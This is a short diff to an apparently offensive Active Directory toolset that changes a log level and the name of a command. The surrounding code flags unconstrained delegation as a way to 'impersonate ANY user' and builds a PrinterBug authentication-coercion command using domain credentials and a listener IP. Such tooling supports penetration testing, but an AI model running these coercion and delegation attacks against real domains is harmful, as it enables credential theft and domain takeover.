@@ -226,7 +226,7 @@ class DelegationTools(Toolset):
             result = stdout + "\n" + (stderr or "")
 
             if "unconstrained" in result.lower():
-                logger.warning("[!] Unconstrained delegation found!")
+                logger.info("[!] Unconstrained delegation found!")
                 result = (
                     "🚨 UNCONSTRAINED DELEGATION DETECTED!\n"
                     "\u2192 Compromise this account to impersonate ANY user\n"
@@ -598,7 +598,7 @@ class DelegationTools(Toolset):
 
         # Use SpoolSample/PrinterBug for coercion
         cmd = [
-            "printerbug.py",
+            "printerbug",
             f"{domain}/{username}:{resolved_password}",
             coerce_from,
             listener_ip,
